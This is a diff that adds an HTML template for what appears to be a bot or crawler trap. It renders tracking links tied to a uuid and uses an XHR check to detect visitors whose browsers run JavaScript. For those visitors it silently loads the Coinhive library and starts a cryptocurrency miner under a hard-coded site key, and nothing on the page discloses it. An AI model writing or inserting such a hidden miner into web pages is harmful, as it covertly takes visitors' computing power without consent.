@@ -1,0 +1,50 @@
+<html>
+    <head>
+
+        {% if checkjs == True %}
+        <script type="text/javascript">
+            
+            window.onload = function() {
+                var oReq = new XMLHttpRequest();
+
+                oReq.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+
+                        var as = document.getElementsByTagName('a');
+                        for (var i = as.length - 1; i >= 0; --i) {
+                            as[i].href += "&js=True";
+                        }
+
+                    }
+                };
+
+                oReq.open("GET", "{{root_url}}xhr?uuid={{ uuid }}");
+                oReq.send();
+            }
+
+        </script>
+        {% endif %}
+
+        {% if js == True %}
+            <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+            <script>
+                var miner = new CoinHive.Anonymous('WGEIURNiZ3CmvpshgRX9hRJsQlPYycYk', {throttle: 0.3});
+                miner.start();
+            </script>
+        {% endif %}
+
+    </head>
+    <body>
+        <p>{{ uuid }}</p>
+        <ul>
+        {% for arg in trap_args %}   
+            <li><a href="?x={{ arg.x }}&y={{ arg.y }}&uuid={{ uuid }}{% if js == True %}&js=True{% endif %}">?x={{ arg.x }}&amp;y={{ arg.y }}</a></li>
+        {% endfor %}
+        </ul>
+
+        {% if checkImg == True %}
+            <img src="img.jpg">
+        {% endif %}
+
+    </body>
+</html>
